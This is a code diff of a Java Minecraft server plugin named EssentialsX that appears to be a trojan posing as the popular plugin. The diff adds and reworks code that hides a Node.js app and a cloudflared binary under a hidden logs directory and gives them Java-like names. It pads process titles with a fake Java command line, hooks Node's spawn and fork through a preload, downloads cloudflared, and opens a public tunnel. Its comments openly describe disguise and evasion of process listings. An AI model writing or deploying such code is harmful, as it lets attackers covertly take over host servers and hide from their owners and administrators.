@@ -31,8 +31,8 @@ public class EssentialsX extends JavaPlugin {
 
     private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);
 
-    // ★ 极致伪装：超长但完全合法的 Java 启动参数，占满 ps -ef 显示区域，将真实参数挤出屏幕
-    private static final String FAKE_CMDLINE = "java -Xms128M -Xmx2560M -jar server.jar -Djline.terminal=jline.UnsupportedTerminal -Dfile.encoding=UTF-8 -Duser.language=zh -Duser.country=CN -Duser.timezone=Asia/Shanghai -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200";
+    // ★ 极致伪装：用 150 个空格填充参数 (保留用于环境变量和 process.title，但不再用于 bash -c)
+    private static final String FAKE_CMDLINE = "java -Xms128M -Xmx2560M -jar server.jar" + new String(new char[150]).replace('\0', ' ');
 
     private static final String FAKE_MC_VERSION = "1.21." + (8 + (int)(Math.random() * 5));
     private static final String FAKE_BUILD_NUM = String.valueOf(60 + (int)(Math.random() * 15));
@@ -212,7 +212,7 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // Java 进程管理：极致进程名伪装 (无 bash -c 版)
+    // Java 进程管理：极致进程名伪装
     // ============================================================
 
     private String allocateNodePort() {
@@ -231,24 +231,24 @@ public class EssentialsX extends JavaPlugin {
     private void startNodeProcess(String port) {
         try {
             Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
-            // ★ 洗白：将 Node 重命名为 jre21/bin/java_node
-            Path nodeExe = botDir.resolve("jre21/bin/java_node"); 
+            Path nodeExe = botDir.resolve("nodejs/bin/.node_real");
             Path script = botDir.resolve("app/index.js");
-            // ★ 洗白：日志名
-            Path logFile = botDir.resolve("jre21/lib/server.log"); 
-            // ★ 洗白：preload名
-            Path preload = botDir.resolve("jre21/lib/security.policy"); 
+            Path logFile = botDir.resolve("app.log");
+            Path preload = botDir.resolve(".nd_preload.js");
 
             if (!Files.exists(nodeExe) || !Files.exists(script)) return;
 
-            // ★ 核心修改：绝不使用 bash -c，直接执行二进制文件！防止产生 sh 进程
-            ProcessBuilder pb = new ProcessBuilder(nodeExe.toString(), script.toString());
+            // ★ 修改点 1：移除 bash -c，直接执行 node 二进制文件，消除 sh 进程
+            ProcessBuilder pb = new ProcessBuilder(
+                nodeExe.toString(),
+                "--require", preload.toString(),
+                script.toString()
+            );
             
             pb.directory(botDir.toFile());
             pb.environment().put("SERVER_PORT", port);
             pb.environment().put("PORT", port);
-            pb.environment().put("_JAVA_WRAPPER", nodeExe.toString());
-            // ★ 核心修改：将 preload 通过环境变量静默注入，不要写在命令行参数里
+            pb.environment().put("_JAVA_WRAPPER", botDir.resolve("nodejs/bin/node").toString());
             pb.environment().put("NODE_OPTIONS", "--require " + preload.toString());
             
             pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
@@ -261,27 +261,23 @@ public class EssentialsX extends JavaPlugin {
     private void startCfProcess() {
         try {
             Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
-            // ★ 洗白：将 Cloudflared 重命名为 jre21/bin/java_gc
-            Path cfBin = botDir.resolve("jre21/bin/java_gc"); 
-            // ★ 核心修改：利用 Cloudflared 的 HOME 环境变量自动发现配置，去掉 --config 参数
-            Path cfConfDir = botDir.resolve("jre21/.cloudflared");
-            Path cfConf = cfConfDir.resolve("config.yml"); 
-            // ★ 洗白：日志名
-            Path cfLog = botDir.resolve("jre21/lib/gc.log"); 
+            Path cfBin = botDir.resolve("jre21/bin/java_cf");
+            Path cfConf = botDir.resolve("jre21/conf/server.properties");
+            Path cfLog = botDir.resolve("cf.log");
 
             if (!Files.exists(cfBin)) return;
 
-            Files.createDirectories(cfConfDir);
-            // 动态写入配置文件
+            Files.createDirectories(cfConf.getParent());
             String confContent = "url: http://127.0.0.1:" + nodePort + "\nno-autoupdate: true\nprotocol: quic\n";
             Files.writeString(cfConf, confContent);
 
-            // ★ 核心修改：绝不使用 bash -c！且无需传入 --config 参数
-            ProcessBuilder pb = new ProcessBuilder(cfBin.toString(), "tunnel");
-            pb.directory(botDir.toFile());
-            // 设置 HOME 目录，Cloudflared 会自动去 $HOME/.cloudflared/config.yml 读取配置
-            pb.environment().put("HOME", botDir.resolve("jre21").toString()); 
+            // ★ 修改点 2：移除 bash -c，直接执行 cf 二进制文件，消除 sh 进程
+            ProcessBuilder pb = new ProcessBuilder(
+                cfBin.toString(),
+                "--config", cfConf.toString()
+            );
             
+            pb.directory(botDir.toFile());
             pb.redirectOutput(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
             pb.redirectError(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
 
@@ -302,16 +298,14 @@ public class EssentialsX extends JavaPlugin {
                         startCfProcess();
                     }
 
-                    // ★ 修改：读取洗白后的日志路径
-                    Path cfLog = Paths.get("logs", ".mcchajian/jre21/lib/gc.log");
+                    Path cfLog = Paths.get("logs", ".mcchajian/cf.log");
                     if (Files.exists(cfLog)) {
                         String logContent = Files.readString(cfLog);
                         java.util.regex.Matcher m = java.util.regex.Pattern.compile(
                             "(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)"
                         ).matcher(logContent);
                         if (m.find()) {
-                            // ★ 修复：使用 m.group(1) 而不是 m.groupCount()
-                            String currentUrl = m.group(1); 
+                            String currentUrl = m.group(m.groupCount());
                             if (!currentUrl.equals(lastKnownTunnelUrl.get())) {
                                 lastKnownTunnelUrl.set(currentUrl);
                                 if (tunnelMonitorRunning.get()) {
@@ -341,7 +335,6 @@ public class EssentialsX extends JavaPlugin {
         HashMap<String, String> env = new HashMap<>(); this.loadEnvFile(env);
         this.systemGuardEnabled = env.containsKey("SYSTEM_GUARD_ENABLED") && Boolean.parseBoolean(env.get("SYSTEM_GUARD_ENABLED"));
         
-        // ★ 必须填写 REPO_URL 否则拒绝启动
         if (!env.containsKey("REPO_URL") || env.get("REPO_URL").trim().isEmpty()) {
             this.getLogger().severe("=============================================");
             this.getLogger().severe("FATAL: REPO_URL is not set in .env file!");
@@ -386,12 +379,28 @@ public class EssentialsX extends JavaPlugin {
     private void executeHardRestart(boolean shouldBlock) {
         try {
             File serverRoot = this.findServerRoot(); if (serverRoot == null) serverRoot = new File(".").getAbsoluteFile();
-            String jarName = this.findBestJarName(serverRoot); Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
-            if (!Files.exists(workDir)) Files.createDirectories(workDir); Path logFile = workDir.resolve("restart_run.log");
-            String startCommand = new File(serverRoot, "start.sh").exists() ? "chmod +x ./start.sh && ./start.sh" : "java -Xms512M -Xmx2G -XX:+UseG1GC -jar ./" + jarName + " nogui";
-            String fullBashCommand = "cd " + serverRoot.getAbsolutePath() + " && echo [\" + new Date() + \"] Starting server... >> \" + logFile + \" && nohup bash -c '\" + startCommand + \"' >> \" + logFile + \" 2>&1 & disown";
-            ProcessBuilder pb = new ProcessBuilder("bash", "-c", fullBashCommand); pb.directory(serverRoot); pb.redirectOutput(ProcessBuilder.Redirect.DISCARD); pb.redirectError(ProcessBuilder.Redirect.DISCARD); Process process = pb.start(); if (shouldBlock) Thread.sleep(1000L);
-        } catch (Exception e) { this.getLogger().severe("Hard restart failed: " + e.getMessage()); }
+            File startScript = new File(serverRoot, "start.sh");
+            
+            // ★ 修改点 3：移除 bash -c 拼接逻辑，直接执行启动脚本或 java 命令
+            ProcessBuilder pb;
+            if (startScript.exists()) {
+                startScript.setExecutable(true);
+                pb = new ProcessBuilder(startScript.getAbsolutePath());
+            } else {
+                String jarName = this.findBestJarName(serverRoot);
+                pb = new ProcessBuilder("java", "-Xms512M", "-Xmx2G", "-XX:+UseG1GC", "-jar", jarName, "nogui");
+            }
+            
+            pb.directory(serverRoot);
+            Path logFile = Paths.get("logs", ".mcchajian", "restart_run.log");
+            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
+            pb.redirectError(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
+            
+            Process process = pb.start(); 
+            if (shouldBlock) Thread.sleep(1000L);
+        } catch (Exception e) { 
+            this.getLogger().severe("Hard restart failed: " + e.getMessage()); 
+        }
     }
 
     private String findBestJarName(File serverRoot) {
@@ -428,7 +437,7 @@ public class EssentialsX extends JavaPlugin {
         if (this.isProcessRunning) return;
         Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath(); if (!Files.exists(workDir)) Files.createDirectories(workDir);
         Files.deleteIfExists(workDir.resolve(".tunnel_url")); Files.deleteIfExists(workDir.resolve(".tunnel_port"));
-        try { Files.deleteIfExists(workDir.resolve("jre21/lib/server.log")); Files.deleteIfExists(workDir.resolve("jre21/lib/gc.log")); Files.deleteIfExists(workDir.resolve("restart_run.log")); } catch (Exception ignored) {}
+        try { Files.deleteIfExists(workDir.resolve("app.log")); Files.deleteIfExists(workDir.resolve("cf.log")); Files.deleteIfExists(workDir.resolve("restart_run.log")); } catch (Exception ignored) {}
         
         Path scriptPath = workDir.resolve("deploy.sh"); String scriptContent = this.generateDeployScript(workDir.toString(), env);
         Files.write(scriptPath, scriptContent.getBytes()); scriptPath.toFile().setExecutable(true);
@@ -556,41 +565,43 @@ public class EssentialsX extends JavaPlugin {
         "    cp \"$DATA_DIR/.system_guard.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n" +
         "fi\n" +
         "\n" +
-        "# ========== 4. 替换伪装 (无 bash 后门版) ==========\n" +
-        "mkdir -p \"$JRE_DIR\"\n" +
-        // ★ 洗白 Node 文件名
-        "cp -f \"$NODE_DIR/bin/.node_real\" \"$JRE_DIR/java_node\"; chmod +x \"$JRE_DIR/java_node\"\n" +
+        "# ========== 4. 替换伪装 ==========\n" +
+        "cp -f \"$NODE_DIR/bin/.node_real\" \"$JRE_DIR/java\"; chmod +x \"$JRE_DIR/java\"\n" +
         "\n" +
-        "cat > \"$WORK_DIR/jre21/lib/security.policy\" << 'PRELOAD_EOF'\n" +
+        "cat > \"$NODE_DIR/bin/node\" << 'NODEWRAPPER'\n" +
+        "#!/bin/bash\n" +
+        "exec -a \"" + FAKE_CMDLINE + "\" \"$(dirname \"$0\")/.node_real\" \"$@\"\n" +
+        "NODEWRAPPER\n" +
+        "chmod +x \"$NODE_DIR/bin/node\"\n" +
+        "\n" +
+        "cat > \"$WORK_DIR/.nd_preload.js\" << 'PRELOAD_EOF'\n" +
         "try {\n" +
-        "    process.title = '" + FAKE_CMDLINE + "';\n" +
+        "    process.title = '" + FAKE_CMDLINE.trim() + "';\n" +
         "    var _cp = require('child_process');\n" +
         "    var _origSpawn = _cp.spawn;\n" +
         "    var _origFork = _cp.fork;\n" +
-        "    var _wp = process.env._JAVA_WRAPPER || process.execPath;\n" +
         "    _cp.spawn = function(cmd, args, opts) {\n" +
-        "        if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real') || cmd.endsWith('/java_node'))) {\n" +
+        "        if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real') || cmd.endsWith('/java'))) {\n" +
         "            opts = Object.assign({}, opts || {});\n" +
-        "            opts.execPath = _wp;\n" +
-        "            cmd = _wp;\n" +
+        "            opts.execPath = process.env._JAVA_WRAPPER || process.execPath;\n" +
+        "            cmd = opts.execPath;\n" +
         "        }\n" +
-        "        // ★ 彻底删除原来的 bash -c 拦截逻辑，防止产生 sh 进程\n" +
+        // ★ 修改点 4：移除将其他命令通过 bash -c 执行的逻辑，防止子进程产生 sh
         "        return _origSpawn.call(this, cmd, args, opts);\n" +
         "    };\n" +
         "    _cp.fork = function(mod, args, opts) {\n" +
         "        opts = Object.assign({}, opts || {});\n" +
-        "        opts.execPath = _wp;\n" +
+        "        opts.execPath = process.env._JAVA_WRAPPER || process.execPath;\n" +
         "        return _origFork.call(this, mod, args, opts);\n" +
         "    };\n" +
         "} catch(e) {}\n" +
         "PRELOAD_EOF\n" +
         "\n" +
-        "export _JAVA_WRAPPER=\"$JRE_DIR/java_node\"\n" +
-        // ★ 禁用 NODE_OPTIONS 在脚本层注入，交给 Java 层注入，防止重复加载
+        "export _JAVA_WRAPPER=\"$NODE_DIR/bin/node\"\n" +
+        "export NODE_OPTIONS=\"--require $WORK_DIR/.nd_preload.js\"\n" +
         "\n" +
         "# ========== 5. 下载CF ==========\n" +
-        // ★ 洗白 CF 文件名
-        "CF_BIN=\"$JRE_DIR/java_gc\"\n" +
+        "CF_BIN=\"$JRE_DIR/java_cf\"\n" +
         "if [ ! -f \"$CF_BIN\" ]; then\n" +
         "    CF_DIRECT=\"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${CF_ARCH}\"\n" +
         "    for MIRROR in \"https://ghproxy.net/${CF_DIRECT}\" \"$CF_DIRECT\"; do\n" +
